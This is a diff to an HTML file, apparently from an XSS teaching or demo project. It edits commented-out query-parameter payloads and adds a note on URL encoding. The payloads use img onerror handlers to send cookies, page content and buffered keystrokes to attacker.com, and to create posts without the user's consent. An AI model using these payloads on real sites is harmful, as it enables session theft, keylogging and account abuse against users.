@@ -48,22 +48,29 @@
 
 <script>
 
+// use encodeURIComponent to encode the user input before using it in the URL
+
 /**
  * query param to xss stealing user cookie
- * name?=<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)"/>
+ * ?name=<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)"/>
  */
 
 
 /**
  * query params to perform unauthorized post creation by calling the createPost function
- * name?=<img src="x" onerror="createPost('Hacked', 'This is a hacked post')"/>
+ * ?name=<img src="x" onerror="createPost('Hacked', 'This is a hacked post')"/>
  */
 
 
 /**
  * query params to steal user information by sending html content to attacker server
- * name?=<img src="x" onerror="fetch('https://attacker.com/steal?user=' + document.getElementById('user').innerHTML)"/> 
+ * ?name=<img src="x" onerror="fetch('https://attacker.com/steal?user=' + document.getElementById('user').innerHTML)"/> 
  */
+
+ /**
+  * queryparam for capturing keystroke of user with buffer using debounce and sending it to attacker server (using clearTimeout and setTimeout for creating buffer)
+  * ?name=<img src="x" onerror="let buffer = ''; let timeoutId = null;  document.addEventListener('keydown', function(e) { buffer = buffer + e.key; clearTimeout(timeoutId); timeoutId = setTimeout(() => { fetch('https://attacker.com/keystroke?key=' + buffer); buffer = ''; }, 2000); });"/>
+  */
 
 
 </script>
